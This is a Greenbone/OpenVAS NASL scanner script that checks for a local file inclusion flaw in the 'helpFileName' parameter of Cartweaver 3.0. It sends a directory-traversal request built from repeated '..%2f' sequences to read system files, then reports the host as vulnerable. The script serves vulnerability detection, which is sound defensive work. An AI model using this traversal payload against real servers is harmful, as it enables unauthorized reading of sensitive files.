if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802997" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 55917 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-10-16 17:35:45 +0530 (Tue, 16 Oct 2012)" );
	script_name( "Cartweaver 'helpFileName' Parameter Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/79227" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/21989/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Cartweaver version 3.0" );
	script_tag( name: "insight", value: "Input passed via 'helpFileName' parameter to AdminHelp.php is
  not properly sanitised before being used to include files." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Cartweaver and is prone to local file
  inclusion vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/", "/cartweaver", "/cartScripts", "/cw", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/admin/helpfiles/AdminHelp.php";
	if(http_vuln_check( port: port, url: url, pattern: ">Cartweaver", check_header: TRUE )){
		for file in keys( files ) {
			url = url + "?helpFileName=a/" + crap( data: "..%2f", length: 3 * 15 ) + files[file];
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

